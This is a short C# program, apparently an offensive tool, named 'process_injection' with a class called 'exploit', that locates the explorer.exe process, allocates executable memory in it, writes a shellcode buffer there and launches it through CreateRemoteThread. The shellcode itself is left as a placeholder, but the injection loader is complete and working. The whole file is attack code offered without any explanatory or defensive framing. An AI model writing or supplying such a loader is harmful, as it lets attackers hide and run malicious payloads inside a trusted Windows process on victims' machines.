using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace process_injection
{
    class exploit
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            Process[] processes = Process.GetProcessesByName("explorer");

            if (processes.Length == 0)
            {
                Console.WriteLine("Explorer.exe is not available");
                return;
            }
            int proccessPID = processes[0].Id;
            IntPtr addrProc = OpenProcess(0x001F0FFF, false, proccessPID);
            IntPtr addr = VirtualAllocEx(addrProc, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = Shellcode; // Add the Shellcode here.
            IntPtr info;
            WriteProcessMemory(addrProc, addr, buf, buf.Length, out info);

            IntPtr exec = CreateRemoteThread(addrProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
